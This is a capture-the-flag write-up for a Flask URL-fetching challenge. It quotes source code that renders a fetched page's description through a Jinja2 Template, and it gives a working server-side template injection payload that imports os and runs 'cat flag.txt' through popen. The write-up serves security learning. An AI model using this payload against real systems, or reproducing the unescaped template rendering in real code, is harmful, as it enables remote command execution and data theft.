# Overview
This is the login and registration interface when we start entering the website  
  
<img width="500" height="300" alt="image" src="https://github.com/user-attachments/assets/2cb3233f-e361-46af-b837-190d75dc273c" />

After creating an account and logging in, you will be taken to a page that allows us to fetch the urls we passed  
<img width="500" height="300" alt="image" src="https://github.com/user-attachments/assets/b4c84f43-731b-4fc2-97cf-ffbce2193a0e" />  

# Recon
Try streaming https://facebook.com  
<img width="500" height="300" alt="image" src="https://github.com/user-attachments/assets/343f43da-8cdb-40b3-a59b-5e3d335e3fca" />  
There are 3 return parameters:  
* Url when fetched
* Title page
* Description
Reading the source code we can see there is a vulnerability related to SSTI:
```
  escaped_description = html.escape(description) # Escape HTML entities in description
  escaped_description = Template(description).render()
  escaped_url = html.escape(url)
  escaped_title = html.escape(title)
```
=> We can see that if we pass an SSTI payload into the description, it will be reflected out  
Analyzing the code a little more, we can see that the website uses flask python to code and the jinja2 template is imported for use.  
```
from flask import Flask, request, render_template, redirect, url_for, session, g
from jinja2 import Template
```
# Solution
Now we will create a web metadata containing description and payload  
```
<html>
  <head>

    <meta name="description" content="{{ 7*’7’}}">
  </head>
  <body>Exploit</body>
</html>
```
We see that the description has executed the payload **SSTI** :  
<img width="500" height="300" alt="image" src="https://github.com/user-attachments/assets/c1233d0b-a486-42fd-b0fb-2f90859ce646" />  
Now we will transmit the payload to read the flag:  
```{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}```  
  
Flag will be returned  
<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/d935b5ef-7d3b-40b7-acfb-c40fd7fced52" />
  
See more: [Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)




